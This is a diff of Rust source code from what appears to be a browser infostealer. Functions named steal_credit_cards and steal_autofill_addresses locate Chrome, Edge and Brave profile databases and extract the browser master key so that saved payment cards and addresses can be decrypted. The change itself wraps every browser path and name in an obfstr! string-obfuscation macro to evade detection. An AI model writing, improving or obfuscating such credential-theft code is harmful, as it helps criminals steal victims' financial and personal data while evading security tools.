@@ -204,18 +204,18 @@ pub fn steal_credit_cards() -> Vec<CreditCard> {
         }
         
         // 🔍 DEBUG: Buscar en perfiles adicionales (Profile 1, Profile 2, etc.)
-        if browser.name == "Edge" || browser.name == "Chrome" {
+        if browser.name == obfstr!("Edge") || browser.name == obfstr!("Chrome") {
             if let Some(local_appdata) = get_appdata_local() {
-                let browser_dir = if browser.name == "Edge" {
-                    local_appdata.join(r"Microsoft\Edge\User Data")
+                let browser_dir = if browser.name == obfstr!("Edge") {
+                    local_appdata.join(obfstr!(r"Microsoft\Edge\User Data"))
                 } else {
-                    local_appdata.join(r"Google\Chrome\User Data")
+                    local_appdata.join(obfstr!(r"Google\Chrome\User Data"))
                 };
                 
                 // Buscar en Profile 1, Profile 2, etc.
                 for i in 1..=5 {
                     let profile_name = format!("Profile {}", i);
-                    let profile_path = browser_dir.join(&profile_name).join("Web Data");
+                    let profile_path = browser_dir.join(&profile_name).join(obfstr!("Web Data"));
                     
                     if profile_path.exists() {
                         if let Some(temp_path) = copy_to_temp(&profile_path) {
@@ -242,13 +242,13 @@ fn steal_credit_cards_from_browser(browser: &BrowserConfig) -> Option<Vec<Credit
     }
     
     // Extraer master key de Local State para v10/v11/v20 (AES-GCM)
-    let master_key = if browser.name == "Chrome" || browser.name == "Edge" || browser.name == "Brave" {
-        let local_state_path = if browser.name == "Edge" {
-            local_appdata.join(r"Microsoft\Edge\User Data\Local State")
-        } else if browser.name == "Chrome" {
-            local_appdata.join(r"Google\Chrome\User Data\Local State")
+    let master_key = if browser.name == obfstr!("Chrome") || browser.name == obfstr!("Edge") || browser.name == obfstr!("Brave") {
+        let local_state_path = if browser.name == obfstr!("Edge") {
+            local_appdata.join(obfstr!(r"Microsoft\Edge\User Data\Local State"))
+        } else if browser.name == obfstr!("Chrome") {
+            local_appdata.join(obfstr!(r"Google\Chrome\User Data\Local State"))
         } else {
-            local_appdata.join(r"BraveSoftware\Brave-Browser\User Data\Local State")
+            local_appdata.join(obfstr!(r"BraveSoftware\Brave-Browser\User Data\Local State"))
         };
         
         extract_master_key(&local_state_path).ok().flatten()
@@ -564,18 +564,18 @@ pub fn steal_autofill_addresses() -> Vec<AutofillAddress> {
         }
         
         // 🔍 DEBUG: Buscar en perfiles adicionales (Profile 1, Profile 2, etc.)
-        if browser.name == "Edge" || browser.name == "Chrome" {
+        if browser.name == obfstr!("Edge") || browser.name == obfstr!("Chrome") {
             if let Some(local_appdata) = get_appdata_local() {
-                let browser_dir = if browser.name == "Edge" {
-                    local_appdata.join(r"Microsoft\Edge\User Data")
+                let browser_dir = if browser.name == obfstr!("Edge") {
+                    local_appdata.join(obfstr!(r"Microsoft\Edge\User Data"))
                 } else {
-                    local_appdata.join(r"Google\Chrome\User Data")
+                    local_appdata.join(obfstr!(r"Google\Chrome\User Data"))
                 };
                 
                 // Buscar en Profile 1, Profile 2, etc.
                 for i in 1..=5 {
                     let profile_name = format!("Profile {}", i);
-                    let profile_path = browser_dir.join(&profile_name).join("Web Data");
+                    let profile_path = browser_dir.join(&profile_name).join(obfstr!("Web Data"));
                     
                     if profile_path.exists() {
                         if let Some(temp_path) = copy_to_temp(&profile_path) {
